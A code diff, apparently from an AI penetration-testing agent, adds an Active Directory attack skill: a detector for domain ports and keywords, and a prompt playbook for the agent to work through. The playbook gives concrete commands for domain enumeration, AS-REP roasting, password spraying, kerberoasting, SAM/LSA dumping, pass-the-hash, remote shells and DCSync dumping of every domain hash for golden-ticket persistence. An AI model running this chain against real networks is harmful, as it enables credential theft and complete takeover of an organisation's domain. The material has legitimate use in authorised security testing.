@@ -215,9 +215,71 @@ CREDENTIAL_ATTACK_SKILL = Skill(
     ),
 )
 
-# The active skill set. Kept tiny on purpose; more skills (LFI, SSTI, cloud, AD)
-# slot in here the same way.
-SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL]
+# Active Directory / Windows-domain services. Kerberos (88) is the strongest single
+# tell; LDAP/GC/WinRM reinforce it. Deliberately does NOT include bare 445/139 (a
+# standalone Samba box is the network/credential playbook's domain, not AD).
+AD_PORTS = {"88", "389", "636", "3268", "3269", "464", "5985", "5986"}
+
+_AD_HINT_RE = re.compile(
+    r"\b(active[-\s]?directory|domain[-\s]?controller|kerberos|kerberoast\w*|"
+    r"as[-\s]?rep|bloodhound|ntlm|pass[-\s]?the[-\s]?hash|secretsdump|dcsync|"
+    r"golden[-\s]?ticket|net-?exec|crackmapexec|impacket|evil-?winrm|ldap|"
+    r"windows[-\s]?domain)\b",
+    re.IGNORECASE,
+)
+
+
+def _is_ad_target(state: Any, user_input: str) -> bool:
+    """An AD / Windows domain is in play if a domain-service port (Kerberos, LDAP,
+    Global Catalog, WinRM) is open, or the request names AD tooling/techniques."""
+    if _bare_ports(state) & AD_PORTS:
+        return True
+    return bool(_AD_HINT_RE.search(user_input or ""))
+
+
+AD_ATTACK_SKILL = Skill(
+    name="active_directory_attacks",
+    matches=_is_ad_target,
+    body=(
+        "ACTIVE PLAYBOOK — an Active Directory / Windows domain is in play "
+        "(Kerberos/LDAP/SMB). This is the highest-yield enterprise path; work it in "
+        "order. Only the operator's named targets/subnet are in scope.\n"
+        "TOOLING: drive Kali tools via kali_run/shell — netexec (nxc) or "
+        "crackmapexec, impacket-* (GetNPUsers/GetUserSPNs/secretsdump/psexec), "
+        "bloodhound-python, kerbrute, ldapsearch, evil-winrm. Get the DOMAIN name and "
+        "a DC IP first (nxc smb <dc>) — most tools need `-d <domain> --dc-ip <ip>`.\n"
+        "1. ENUMERATE (works even unauthenticated): `nxc smb <dc> -u '' -p ''` (null "
+        "session → users, shares, password policy); `nxc ldap <dc>` / ldapsearch and "
+        "`enum4linux-ng <dc>` for users/SPNs. Build a users.txt.\n"
+        "2. GET A FIRST CRED (no creds yet): AS-REP roast users without pre-auth — "
+        "`impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <ip> -no-pass` → "
+        "crack the $krb5asrep$ (hashcat -m 18200). Or PASSWORD SPRAY carefully "
+        "(mind lockout): `nxc smb <dc> -u users.txt -p 'Winter2025!' "
+        "--continue-on-success`, plus username==password.\n"
+        "3. WITH ANY DOMAIN CRED — escalate: KERBEROAST `impacket-GetUserSPNs "
+        "<domain>/<user>:<pass> -dc-ip <ip> -request` → crack $krb5tgs$ (-m 13100). "
+        "MAP THE GRAPH `bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> "
+        "-c all` → shortest path to Domain Admin (GenericAll/WriteDACL, unconstrained "
+        "delegation, DCSync rights). SPRAY the cred across hosts to find local admin "
+        "(`nxc smb <subnet> -u <user> -p <pass>` → look for Pwn3d!).\n"
+        "4. LATERAL / DUMP: where you're admin — `impacket-secretsdump "
+        "<domain>/<user>:<pass>@<host>` (SAM/LSA) or `nxc smb <host> ... --sam --lsa`; "
+        "shell via `evil-winrm -i <host> -u <user> -p <pass>` or impacket-psexec/"
+        "wmiexec. PASS-THE-HASH with a dumped NTLM: `nxc smb <host> -u <user> "
+        "-H <hash>` (no plaintext needed).\n"
+        "5. DOMAIN TAKEOVER: with DA or DCSync rights → `impacket-secretsdump "
+        "-just-dc <domain>/<user>:<pass>@<dc>` dumps every hash incl. krbtgt "
+        "(→ golden ticket = persistent domain control).\n"
+        "DON'T FIXATE: if a host/vector is dead, spray the next — BloodHound tells "
+        "you where to aim. PROOF = actual tool output (a cracked cred, a shell, a "
+        "dumped hash); never invent it."
+    ),
+)
+
+# The active skill set. Kept tiny on purpose; more skills (LFI, SSTI, cloud) slot
+# in here the same way.
+SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL,
+                       AD_ATTACK_SKILL]
 
 
 def relevant_skills(state: Any, user_input: str = "") -> list[str]:
